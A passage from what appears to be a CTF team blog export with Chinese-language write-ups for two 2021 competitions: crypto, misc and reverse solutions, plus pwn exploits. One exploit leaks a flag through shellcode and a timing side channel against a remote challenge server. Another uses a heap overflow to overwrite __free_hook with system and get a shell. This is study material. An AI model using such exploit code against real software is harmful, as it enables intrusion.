0x47, 0x42, 0x11 ] flag = \u0026#39;\u0026#39; x = 36 y = 0 z = 72 for i in s2[::-1]: flag += chr(((i ^ z) - y) ^ x) x += 2 y += 1 z += 2 print (flag[::-1]) # \u0026#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}\u0026#39; Crypto [萌新]素数 使用gmpy2生成10个大素数，然后依次提交即可\n[签到]键盘侠 根据题目名称，猜测和键盘有关系\n将密文放入键盘的对应位置后，发现一组密文在键盘上构成一个图案，这个图案是一个字母\n比如UYTGBNM在键盘上组成一个C，同样的方式和可以还原出其他字母\nsilent_peeper 离散对数，考虑幂只有40bit，用BSGS即可解出答案。\nsage: p = 17480715736546509273132356167852223654917350291331787539356496312333028105252468745075491024000992015452563532 ....: 520952698743383378549938420481917954954410649849158983419586000890687503941868419125253760412312965974672161440234 ....: 6449135195832955793815709136053198207712511838753919608894095907732099313139446299843 ....: g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307 ....: 185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366 ....: 973332463469104730271236078593527144954324116802080620822212777139186990364810367977 ....: sage: bsgs(mod(g,p),mod(A,p),(0,1\u0026lt;\u0026lt;40)) 822690494337 sage: bsgs(mod(g,p),mod(B,p),(0,1\u0026lt;\u0026lt;40)) 621209248538 sage: key = pow(A, 621209248538 ,p) sage: key 49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756 \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import * \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; ciphertext = 0xed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c \u0026gt;\u0026gt;\u0026gt; key = 49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756 \u0026gt;\u0026gt;\u0026gt; key = long_to_bytes(key)[:16] \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; cipher.decrypt(int.to_bytes(ciphertext, ciphertext.bit_length()//8, \u0026#39;big\u0026#39;)) b\u0026#39;flag{21384433-0dc7-413b-9d09-64cc97c99730}\\x06\\x06\\x06\\x06\\x06\\x06\u0026#39; EzDES 题目是个DES一轮差分，有数学公式: $ L_1=R_0,R_1=L_0\\oplus f(R_0,K_0) $，其中L1R1,L0R0都是已知量，只需要逆推到s盒附近，通过s盒的结果爆破s盒的输入即可，有65536种可能，然后用剩下几个明密文对验证，排除出剩一种结果。主要代码如下(请将S盒，IP盒等内容分别命名为IP_1.txt，sbox.txt等放入文件src子目录下，详情见代码)\n######################################################################### # Get roundKey ######################################################################### # get the move number def getMoveNum(): res = [0] * 16 for i in range(16): if i == 0 or i == 1 or i == 8 or i == 15: res[i] = 1 else: res[i] = 2 return res # get the PC_1 table and PC_2 table def getPC(): PC_1_str = open(\u0026#39;./src/PC_1.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() PC_2_str = open(\u0026#39;./src/PC_2.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() PC_1 = [0] * len(PC_1_str) PC_2 = [0] * len(PC_2_str) for i in range(len(PC_1_str)): PC_1[i] = int(PC_1_str[i]) for i in range(len(PC_2_str)): PC_2[i] = int(PC_2_str[i]) return PC_1, PC_2 # cyclic shift to the left def leftRow(arr, n): temp = [0] * n length = len(arr) for i in range(n): temp[i] = arr[i] for i in range(length): if i \u0026lt; length - n: arr[i] = arr[i + n] else: arr[i] = temp[i - length + n] return arr # get the k0 - k16 def genKey(key): C = [0] * 28 D = [0] * 28 K = [0] * 56 roundKey = [[0]*48 for i in range(16)] PC_1, PC_2 = getPC() moveNum = getMoveNum() # get K+ for i in range(56): K[i] = key[PC_1[i] - 1] # get C0 and D0 for i in range(28): C[i] = K[i] D[i] = K[i + 28] # get roundKey for i in range(16): C = leftRow(C, moveNum[i]) D = leftRow(D, moveNum[i]) for j in range(48): if PC_2[j] \u0026lt;= 28: roundKey[i][j] = C[PC_2[j] - 1] else: roundKey[i][j] = D[PC_2[j] - 28 -1] return roundKey ######################################################################### # Encrypt and Decrypt ######################################################################### #get the IP and PC_1 table def getIP(): IP_str = open(\u0026#39;./src/IP.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() IP_1_str = open(\u0026#39;./src/IP_1.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() IP = [0] * len(IP_str) IP_1 = [0] * len(IP_1_str) for i in range(len(IP_str)): IP[i] = int(IP_str[i]) for i in range(len(IP_1_str)): IP_1[i] = int(IP_1_str[i]) return IP, IP_1 # l1 xor l2 def xor(l1, l2): res = [0] * len(l1) for i in range(len(l1)): res[i] = l1[i] ^ l2[i] return res # get the Extend table def getE(): E_str = open(\u0026#39;./src/extend.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() E = [0] * len(E_str) for i in range(len(E_str)): E[i] = int(E_str[i]) return E # extend R from 32 bit to 48 bit def extend(R): res = [0] * 48 E = getE() for i in range(48): res[i] = R[E[i] - 1] return res # get sbox in 3 dim def getSbox(): S_str = open(\u0026#39;./src/sbox.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() S = [[[0]*16 for i in range(4)]for i in range(8)] l = 0 for i in range(8): for j in range(4): for k in range(16): S[i][j][k] = int(S_str[l]) l += 1 return S # number in dec to number in bit def d2b(n): res = \u0026#39;\u0026#39; while n \u0026gt; 0: res += chr(n % 2 + ord(\u0026#39;0\u0026#39;)) n = n // 2 while len(res) \u0026lt; 4: res += \u0026#39;0\u0026#39; return res[::-1] # sbox replacement def sbox(ipt): S = getSbox() res = [0] * 32 i, l = 0, 0 while i \u0026lt; 48: j = ipt[i] * 2 + ipt[i + 5] k = ipt[i + 1] * 8 + ipt[i + 2] * 4 + ipt[i + 3] * 2 + ipt[i + 4] temp = d2b(S[l][j][k]) for m in range(4): res[m + l * 4] = int(temp[m]) l += 1 i += 6 return res # get Pbox def getPbox(): P_str = open(\u0026#39;./src/pbox.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split() P = [0] * len(P_str) for i in range(len(P_str)): P[i] = int(P_str[i]) return P # pbox replacement def pbox(ipt): P = getPbox() res = [0] * 32 for i in range(32): res[i] = ipt[P[i] - 1] return res # f function def f(R, K): # extend R E_R = extend(R) # E_R xor K afterADD = xor(E_R, K) # sbox afterSbox = sbox(afterADD) # linear displacement res = pbox(afterSbox) return res # Encrypt function def DES_Encrypt(plaintext, roundkey): M_IP = [0] * 64 cipher = [0] * 64 afterF = [0] * 64 L = [[0] * 32 for i in range(17)] R = [[0] * 32 for i in range(17)] IP, IP_1 = getIP() # get IP replace for i in range(64): M_IP[i] = plaintext[IP[i] - 1] # get L0 and R0 for i in range(32): L[0][i] = M_IP[i] R[0][i] = M_IP[i + 32] for i in range(1,17): # L[i] = R[i - 1] for j in range(32): L[i][j] = R[i - 1][j] R[i] = xor(L[i - 1], f(R[i - 1], roundkey[i - 1])) # merge the R and L for i in range(64): if i \u0026lt; 32: afterF[i] = R[16][i] else: afterF[i] = L[16][i - 32] # using IP_1 replace to get cipher for i in range(64): cipher[i] = afterF[IP_1[i] - 1] return cipher ######################################################################### # Main ######################################################################### # number in hex to number in bin def hex_to_bin(a): b = int(a, 16) res = \u0026#39;\u0026#39; while b \u0026gt; 0: res += chr(b % 2 + ord(\u0026#39;0\u0026#39;)) b = b // 2 while len(res) \u0026lt; 4: res += \u0026#39;0\u0026#39; return res[::-1] # text in hex to text in bin def h2b(s): res = [] for i in s: temp = hex_to_bin(i) for j in range(4): res.append(int(temp[j])) return res # number in bin to number in hex def bin_to_hex(a): b = int(a, 2) return hex(b)[2:] # text in bin to text in hex def b2h(s): res = \u0026#39;\u0026#39; now_bin = \u0026#39;\u0026#39; for i in range(len(s)): now_bin += chr(s[i] + ord(\u0026#39;0\u0026#39;)) if len(now_bin) % 4 == 0: res += bin_to_hex(now_bin) now_bin = \u0026#39;\u0026#39; return res def gen_P_1(): p = getPbox() p_1 = [0] * 32; for i in range(32): p_1[p[i] - 1] = i return p_1 def str2martix(s): m = [0] * 6 for i in range(6): m[i] = int(s[i], 2) return m def solve(plaintext, cipher): m = h2b(plaintext) c = h2b(cipher) C_IP = [0] * 64 M_IP = [0] * 64 cipher = [0] * 64 may_after_xor = [[\u0026#39;\u0026#39;for i in range(4)]for j in range(8)] L = [[0] * 32 for i in range(17)] R = [[0] * 32 for i in range(17)] ast = [0] * 32 IP, IP_1 = getIP() before_p = [0] * 32 S = getSbox() p_1 = gen_P_1() # get IP replace for i in range(64): M_IP[i] = m[IP[i] - 1] C_IP[i] = c[IP[i] - 1] # get L0 and R0 for i in range(32): L[0][i] = M_IP[i] R[0][i] = M_IP[i + 32] for i in range(32): L[1][i] = C_IP[i] R[1][i] = C_IP[i + 32] e = extend(R[0]) cip = xor(R[1], L[0]) for i in range(32): before_p[i] = cip[p_1[i]] # 还原进入sbox前的值 for i in range(8): for j in range(4): for k in range(16): if S[i][j][k] == int(b2h(before_p[i*4:(i+1)*4]), 16): may_after_xor[i][j] = (bin(j)[2:].zfill(2)[0] + bin(k)[2:].zfill(4) + bin(j)[2:].zfill(2)[1]) may_res = [[[]for i in range(4)]for j in range(8)] for i in range(8): for j in range(4): may_after_xor[i][j] = str2martix(may_after_xor[i][j]) # 还原所有可能的K for i in range(8): for j in range(4): may_res[i][j] = (xor(may_after_xor[i][j], e[i*6:(i+1)*6])) return may_res def gen_PC_1(): PC_1, PC_2 = getPC() PC1, PC2 = [-1] * 64, [-1] * 56 for i in range(56): PC1[PC_1[i] - 1] = i for i in range(48): PC2[PC_2[i] - 1] = i return PC1, PC2 # def resolve_key(roundKey): # C = [0] * 28 # D = [0] * 28 # K = [0] * 56 # PC_1, PC_2 = getPC() # PC1, PC2 = gen_PC_1() # moveNum = getMoveNum() # for i in range(48): # if PC2[j] \u0026lt;= 28: # C[PC2[j]] = roundKey[i] # else: # D[PC2[j] - 28] = roundKey[i] # C = leftRow(C, 28 - moveNum[i]) # D = leftRow(D, 28 - moveNum[i]) # for i in range(28): # K[i] = C[i] # K[i + 28] = D[i] # for i in range(56): # key[PC1[i]] = K[i] # return key if __name__ == \u0026#39;__main__\u0026#39;: plaintext1 = \u0026#34;4845AB454511C0F0\u0026#34; miwen1 = \u0026#34;2EA85F08AA80C2D2\u0026#34; plaintext2 = \u0026#34;0123456789ABCDEF\u0026#34; miwen2 = \u0026#34;0293A8B9E45FCE5D\u0026#34; plaintext3 = \u0026#34;81120015A001FDF1\u0026#34; miwen3 = \u0026#34;E88382207800FE7A\u0026#34; plaintext4 = \u0026#34;2214500AEF00CD48\u0026#34; miwen4=\u0026#34;B38AA0AD7720E4AC\u0026#34; plaintext5 = \u0026#34;5791AC22121B1234\u0026#34; miwen5=\u0026#34;A3C0DEB9AB0F833A\u0026#34; K1 = solve(plaintext1, miwen1) K2 = solve(plaintext2, miwen2) K3 = solve(plaintext3, miwen3) K4 = solve(plaintext4, miwen4) K5 = solve(plaintext5, miwen5) K = [] for i in range(8): for j in range(4): if (K1[i][j] in K2[i]) and (K1[i][j] in K3[i]) and (K1[i][j] in K4[i]) and (K1[i][j] in K5[i]): print(i, j) K += K1[i][j] print(K) Misc [萌新]在哪儿呢 PDF里面有很多不可见字符，直接复制粘贴到sublime里面就可以看到flag\nflag{hey_there_is_no_thing}\n[签到]签到 题目描述，直接提交\n只是个PNG，别想太多了.png 拿到png，利用pngdebugger查，发现后面的块恢复成IDAT就行\n\r\ncrc不对，爆破长宽，抄了个大师傅的脚本\nimport zlib import struct file = \u0026#39;PNG.png\u0026#39; fr = open(file,\u0026#39;rb\u0026#39;).read() data = bytearray(fr[12:29]) crc32key = eval(str(fr[29:33]).replace(\u0026#39;\\\\x\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#34;b\u0026#39;\u0026#34;,\u0026#39;0x\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#39;)) #crc32key = 0xCBD6DF8A  #data = bytearray(b\u0026#39;\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xF1\\x08\\x06\\x00\\x00\\x00\u0026#39;)  n = 4095 for w in range(n): width = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, w)) for h in range(n): height = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+\u0026#39;.png\u0026#39;,\u0026#39;wb\u0026#39;) fw.write(newpic) fw.close # return None 恢复后图片新增内容\n\r\n看到多了一个压缩的部分，拿binwalk分了下，flag在后面的文件中\nflag{zhe_ti_mu_ye_tai_bt_le_XD}\n压缩包压缩包压缩包压缩包 import zipfile import os for i in range(0,1000): name = os.listdir(\u0026#34;./\u0026#34;)[0] zfile = zipfile.ZipFile(name,\u0026#39;r\u0026#39;) in_file = zfile.namelist()[0] passwd = in_file[0:-4] zfile.extract(in_file, \u0026#39;./\u0026#39;,bytes(passwd,encoding =\u0026#34;ascii\u0026#34;)) zfile.close() os.remove(name) 解出23333.zip\n密码根据规律猜测是3-6位，爆破得到756698是密码\n010editor搜索flag得到flag\nflag{Unz1p_i5_So_C00l##}\nrange_download 过滤dns报文，存在几条query name为xx.nss.neusoft.edu.cn的dns请求包，应该是base64编码的dns隧道，上脚本分析：\nimport pyshark import re import base64 cap = pyshark.FileCapture(\u0026#39;range.pcapng\u0026#39;,display_filter=\u0026#39;dns and dns.flags==0x00000100 and dns.qry.name matches \u0026#34;^[^.-]*\\.nss.neusoft.edu.cn$\u0026#34;\u0026#39;) datas = [] ids = [] for pkt in cap: name = pkt.dns.qry_name id = pkt.dns.id match = re.search(\u0026#39;^([^.-]*)\\.nss.neusoft.edu.cn$\u0026#39;, name) data = \u0026#39;\u0026#39; if match: data = match.group(1) if data == \u0026#39;\u0026#39;: print(\u0026#39;error! \u0026#39; + name) if id in ids: continue datas.append(data) ids.append(id) line = \u0026#39;\u0026#39;.join(datas) img = base64.b64decode(line.encode()) print(img) cap.close() 跑出来是password: nss_yyds!\n过滤http协议，全都是206 Partial Content，把flag.7z一个字节一个字节地传了过来，顺序是乱的，需要写脚本恢复。调试的时候发现基本每个字节都会被传输很多次，并且有一个字节没有被传输，这些在写脚本的时候都需要注意到。\nimport pyshark import re import base64 cap = pyshark.FileCapture(\u0026#39;range.pcapng\u0026#39;,display_filter=\u0026#39;http and http.response.code == 206\u0026#39;) data = bytearray(2460) poslist = [False for i in range(2460)] for pkt in cap: length = int(pkt.http.content_length) payload = pkt.http.file_data.binary_value for field in pkt.http.response_line.alternate_fields: if field.showname_key == \u0026#39;Content-Range\u0026#39;: pos_start = -1 pos_end = -1 contentRange = field.showname_value.strip(\u0026#39;\\\\r\\\\n\u0026#39;) match = re.search(\u0026#39;bytes (\\d+)-(\\d+)/\\d+\u0026#39;, contentRange) if match: pos_start = int(match.group(1)) pos_end = int(match.group(2)) assert(pos_end - pos_start + 1 == length) for i in range(pos_start, pos_end+1): if poslist[i] == True: assert(data[i] == payload[i-pos_start]) else: poslist[i] = True data[pos_start:pos_end+1] = payload else: print(\u0026#39;Error! Range not found!\u0026#39;) exit(0) break else: pass for i in range(2460): if poslist[i] == False: print(i) cap.close() with open(\u0026#39;flag.7z\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(data) 下标2349位置的字节未知，需要爆破一下：\nimport py7zr import os import _lzma with open(\u0026#39;flag.7z\u0026#39;,\u0026#39;rb\u0026#39;) as f: source = f.read() data = bytearray(source) for i in range(256): print(\u0026#34;Now: \u0026#34;+str(i)) data[2349] = i with open(\u0026#39;flag%d.7z\u0026#39;%(i),\u0026#39;wb\u0026#39;) as f1: f1.write(data) try: with py7zr.SevenZipFile(\u0026#39;flag%d.7z\u0026#39;%(i), \u0026#39;r\u0026#39;, password=\u0026#39;nss_yyds!\u0026#39;) as archive: if archive.test() == True or archive.test() == None: print(\u0026#39;Found:\u0026#39; + str(i)) break else: os.remove(\u0026#39;flag%d.7z\u0026#39;%(i)) except (py7zr.exceptions.Bad7zFile, _lzma.LZMAError) as e: print(e) os.remove(\u0026#39;flag%d.7z\u0026#39;%(i)) 运行结果是194，将flag194.7z解压得到flag.png\n\r\n解码为5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d\nciphey一把梭：\n\r\nflag{6095B134-5437-4B21-BE52-EDC46A276297}\n","date":"2021-12-06T19:23:41+08:00","image":"https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams_hu9bd851d71a6520395d404c81ac536fbe_87588_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/","title":"2021暗泉杯 Writeup"},{"content":"Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件\nwinhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为\nIn order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png\nPwn secretcode 掏出初赛的代码稍微改改\nfrom pwn import * import sys # context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#39;amd64\u0026#39; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def pwn(p, index, ch): # open shellcode = \u0026#34;push 0x1003caaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;\u0026#34; # re open, rax =\u0026gt; 4 shellcode += \u0026#34;and ecx,0x15;inc ecx;\u0026#34; shellcode += \u0026#34;s:push 2; pop rax; push rcx;syscall; pop rcx;loop s;\u0026#34; # read(rax, 0x10040, 0x50) shellcode += \u0026#34;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;\u0026#34; # cmp and jz if index == 0: shellcode += \u0026#34;cmp byte ptr[rsi+{0}], {1}; jz $-3; ret\u0026#34;.format(index, ch) else: shellcode += \u0026#34;cmp byte ptr[rsi+{0}], {1}; jz $-4; ret\u0026#34;.format(index, ch) shellcode = asm(shellcode) pay = shellcode.ljust(0x40 - 4, b\u0026#39;a\u0026#39;) + b\u0026#39;flag\u0026#39; log.warning(hex(len(pay))) p.sendafter(\u0026#34;==\\n\u0026#34;, pay) index = 0 ans = [] while True: for ch in range(0x20, 127): try: if debug: p = process(\u0026#34;./chall\u0026#34;) else: p = remote(\u0026#39;47.104.169.149\u0026#39;, 25178) pwn(p, index, ch) start = time.time() p.recv(timeout=2) except: pass end = time.time() p.close() if end - start \u0026gt; 1.5: ans.append(ch) print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) break else: print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) break index = index + 1 print(ans) print(\u0026#34;\u0026#34;.join([chr(i) for i in ans])) p.interactive() babynote abs32的洞，直接上下无限堆溢出\nfrom pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./chall\u0026#34;) libc = ELF(\u0026#34;/home/daidaishou/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6\u0026#34;) else: p = remote(\u0026#34;47.104.169.149\u0026#34;,\u0026#34;14269\u0026#34;) libc = ELF(\u0026#34;./libc-2.27.so\u0026#34;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def menu(i): sla(\u0026#39;\u0026gt; \u0026#39;, str(i)) def add(sz, c): menu(1) sla(\u0026#39;size\u0026gt; \u0026#39;, str(sz)) sa(\u0026#39;msg\u0026gt; \u0026#39;, c) def free(i): menu(3) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) def edit(i, offset, c): menu(2) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) sla(\u0026#39;offset\u0026gt; \u0026#39;, str(offset)) sa(\u0026#39;msg\u0026gt; \u0026#39;, c) def show(i): menu(4) sla(\u0026#39;idx\u0026gt; \u0026#39;, str(i)) debugf() add(0x29c, b\u0026#39;Chunk_0\\n\u0026#39;) add(0x200, b\u0026#39;Chunk_1\\n\u0026#39;) add(0x78, b\u0026#39;Chunk_2\\n\u0026#39;) add(0x21f, b\u0026#39;Chunk_3\\n\u0026#39;) add(0x18, b\u0026#39;/bin/sh\\n\u0026#39;) edit(0, 0x80000000, b\u0026#39;\\x07\u0026#39;*0x5e + b\u0026#39;\\n\u0026#39;) free(1) edit(3, 0x80000000, b\u0026#39;a\u0026#39;*0x52 + p64(0x80+0x210) + p64(0x230) + b\u0026#39;\\n\u0026#39;) free(3) add(0x200, \u0026#39;Chunk_1\\n\u0026#39;) show(2) libc.address = u64(rv(6) + b\u0026#39;\\x00\u0026#39;*2) - 0x3ebca0 log.warning(hex(libc.address)) free_hook = libc.sym[\u0026#39;__free_hook\u0026#39;] edit(0, 0x80000000, b\u0026#39;\\x01\u0026#39;*(12+0x80)+p64(free_hook)*0x60 + b\u0026#39;\\n\u0026#39;) add(0xd8, p64(libc.sym[\u0026#39;system\u0026#39;]) + b\u0026#39;\\n\u0026#39;) free(4) p.interactive() Re abc 动调，发现输入主要是进入一个case语句\n__int64 __fastcall sub_401406() { char *v0; // rax  int v1; // ecx  v1 = *v0; switch ( v1 ) { case \u0026#39;#\u0026#39;: // 右  return sub_400A65(); case \u0026#39;$\u0026#39;: // 上  return sub_40085B(); case \u0026#39;%\u0026#39;: // 左  return sub_400B6D(); case \u0026#39;@\u0026#39;: // 下  return sub_40095D(); } sub_4013EE(); return sub_400C6F(); } 分别查看四个函数，发现主要是将内存中的-1与另一个数据进行交换\n最后的验证逻辑为\nv10 = __ROR4__(__ROL4__(0x75DFBD5B, 15) ^ 0xDEADBEEF, 10);// 1  for ( i = v10; i \u0026lt; 15; i = i - 84 + 85 ) { sub_400CBA(); if ( box[i] - box[i - 1] != 1 ) v10 = __ROR4__(__ROL4__(0x7DDFBD5B, 15) ^ 0xDEADBEEF, 10); } 内存中总共有16个数字，猜测是一个十六格的拼图\n1, A, 2, 3, 5, D, 6, 4, 9,-1, 7, B, E, F, C, 8 其中-1可以上下左右交换位置\n手动解一下，远程验证\n$$##@@%%$##@@%$$#@%%%@#$%@##$%%@##$%@#$#@ executable_pyc 工具还原字节码，根据字节码手动恢复出python脚本，得到加密逻辑\ndef e2(m): assert type(m) == bytes l = len(m) // 2 m1 = s2n(m[:l]) m2 = s2n(m[l:]) p = gen_prime(1024) q = gen_prime(1024) pp = g.next_prime(p + 2333) qq = g.next_prime(q + 2333) e = g.next_prime(65535) ee = g.next_prime(e) n = p * q nn = pp * qq c1 = n2s(pow(m1, e, n)) c2 = n2s(pow(m2, ee, nn)) print (str(n), nn.digits(), (c1 + c2).hex()) 后面就是解密码题了，需要找出p和q\n因为素数的频率大概在​ $\\ln(n)$ 的时间复杂度，所以​ $pp$ 和 $p$ ​以及 $qq$ ​和 $q$ ​的差距很小，大概在 $​p+2333+\\ln(p)$ 附近。\n所以让 $pp=p+x, qq=q+y$​。有 $n=pq, nn=pp*qq=(p+x)(q+x)=n+py+qx+xy$\n让 $dn=nn-n=py+qx+xy=py+xn/p+xy$​，有 $yp^2+(xy-dn)p+xn=0​$\n如果让 $​p$ 有解，则让 $\\Delta=(xy-dn)^2-4xyn=x^2y^2-2\\cdot dn\\cdot xy+(dn)^2-4xyn\u0026gt;0$ ​且能够保证 $\\Delta$​开出整数方根。函数如下\ndef qiugen(x, y, dn): cur = x ** 2 * y ** 2 + dn ** 2 - 2 * dn * x * y - 4 * x * y * n cur_root = root(cur, 2) if cur_root ** 2 == cur: up = dn - x * y + cur_root if up % (2 * y) == 0: ans = up // (2 * y) return ans return -1 然后开始遍历​x,y，考虑到素数频率，可以大致确定x,y范围为[2333, 2333+1024]​。将其范围扩展到[2333, 4333]​。这样遍历的范围在4000000次qiugen函数运算。\n考虑到​nn确定，所以​x,y之间应该满足某种条件。​\n$\\Delta=x^2y^2-2dn\\cdot xy+(dn)^2-4xyn=h^2-(2dn+4n)h+(dn)^2$，其中$h=xy$​。如果需要让​$\\Delta\u0026gt;0$，需要$h\u0026lt;dn+2n-2*sqrt(dn\\cdot n+n^2)$，约为6174696​。\n所以可以令x遍历[2333,4333]，令y遍历[2333,6174696/x]​，即可找到真正的​x,y。即可得到p,q,pp,qq​。\nfrom Qmath import root from libnum import * from gmpy2 import next_prime ​ n = 10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593056153329019331663146921270200309620591339456771948171473174493228003768777355758929283942611167959313149646888081882056633536206394514157657102927145569575772516981907153659054180860331268989018643271316833183194539111739812416472551511615664022982639779869597584768094658974144703654232643726744397158318139843 nn = 10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593061197309859493502461339998035893727381543475878482841368750058482267744297318087515308976122481608145274938058888809506400916026737269420025654685431401793700398817215185170304169141953786566489760847593258253794575454082327627379713144072687287826518630644255675609067675836382036436064703619178779628644141463 cipher = 0x22cca5150ca0bb2132f68302dc7441e52b91ae7252e44cc13ed83e58253a9aaaa55e095ba36748dff7ea21fff553f8c4656e77a508b64da054f1381b7e2d0600bcec6ed9e1cc8d14c2362aaef7a972a714f88e5afb2d39ed77d0c22a449ca2cfb0802c138f20e0ecbd3c174151cdb8e8ca6d89aa3c503615ebfbc851af5ac51dcfa8b5869b775b57a27b9e4346979180d89b303cae2c5d9e6cabb3c9947837bd8f92333532d4b54dd72ea35400060006328f6f4329147df195ec78a7ab9d39973ce0fd6511e7a0de54737bee64476ba531604f0375b08adf7d768c41ba9e2ba88468d126561a134de79dc0217c1c56d219ca6747103618e46f35281feb9e6050c93e32e26e21ee2c3495f60db2fad9f9a5c570c9f97aee698024ebff6163ef26e32958872db7c593d7f41f90981b8db45aa01085be1e61f7603ecf3d5c032dd90dea791cd9825299548c0cbe7dadabc157048a7fd5cd4bcb1cfeaf0bd2d679f66cb0b1c33ec04bd20317f872c85d500a3475833f983fdee59b3f61a731e2a8b9a60bd7d840f46e97f06dd4fd8ad1cb4d13a82da01938801c33835ceaf34e1cf62ebdde7ac68b17c2a236b64ffacd2a0e7258571ce570871aea9f309df63c0a3abcfa0c05d159a82f9fa3f3ad73944e4ae33c3432c8b65c0d6fe9b560220b14abe5886188fc1e6afa4bb4395669618387224422acf20b519af902225e270 ​ dn = nn - n ​ def qiugen(x, y, dn): cur = x ** 2 * y ** 2 + dn ** 2 - 2 * dn * x * y - 4 * x * y * n cur_root = root(cur, 2) if cur_root ** 2 == cur: up = dn - x * y + cur_root if up % (2 * y) == 0: ans = up // (2 * y) return ans return -1 ​ ​ for x in range(4333, 2333, -1): if (x - 2333) % 100 == 0: print x for y in range(6174700 // x, 2332, -1): cur_ans = qiugen(x, y, dn) if cur_ans != -1: print cur_ans if n % cur_ans == 0: p = cur_ans q = n // p print cur_ans pp = next_prime(p + 2333) qq = next_prime(q + 2333) print (n2s(pow(c1, invmod(0x10001, (p - 1) * (q - 1)), p * q))) print (n2s(pow(c2, invmod(0x10003, (pp - 1) * (qq - 1)), pp * qq))) Crypto crack point 已知椭圆曲线正常加密，key的位数过小，大步小步法爆破2的39次方到2的40次方寻找key=436370150383，算出\npoint2 = (54874480268135442592960451774606422130 : 54593336491331150503709607435043296744 : 1)\nflag = cipher - point_2得到最终点\n","date":"2021-11-05T16:23:41+08:00","permalink":"https://or4ngesec.github.io/post/bluehat-final-writeup/","title":"2021蓝帽杯决赛 Writeup"}]